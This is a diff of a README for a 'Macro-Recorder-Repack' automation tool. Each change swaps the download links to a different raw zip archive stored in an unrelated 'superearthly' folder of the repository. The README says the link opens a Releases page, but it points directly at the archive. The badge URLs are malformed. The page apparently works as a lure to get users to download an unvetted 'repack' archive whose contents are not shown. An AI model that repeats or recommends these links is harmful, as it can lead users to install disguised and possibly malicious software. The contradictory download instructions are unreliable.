@@ -1,6 +1,6 @@
 # 🎹 Macro-Recorder-Repack - Automate Your Repetitive Tasks Easily
 
-[![Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Repack_Recorder_Macro_3.7.zip%20Now%20-Click%20Here-brightgreen)](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Repack_Recorder_Macro_3.7.zip)
+[![Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Recorder-Macro-Repack-2.1.zip%20Now%20-Click%20Here-brightgreen)](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Recorder-Macro-Repack-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Macro-Recorder-Repack! This tool helps you automate repetitive tasks 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Repack_Recorder_Macro_3.7.zip). 
+To get started, visit this page to download: [Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Recorder-Macro-Repack-2.1.zip). 
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version listed.
@@ -86,4 +86,4 @@ For more help or to find community support, visit our official documentation or 
 
 Ready to simplify your workflow? Start automating today!
 
-[![Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Repack_Recorder_Macro_3.7.zip%20Now%20-Click%20Here-brightgreen)](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Repack_Recorder_Macro_3.7.zip)
+[![Download Macro-Recorder-Repack](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Recorder-Macro-Repack-2.1.zip%20Now%20-Click%20Here-brightgreen)](https://github.com/OmarMuhammad56/Macro-Recorder-Repack/raw/refs/heads/main/superearthly/Recorder-Macro-Repack-2.1.zip)
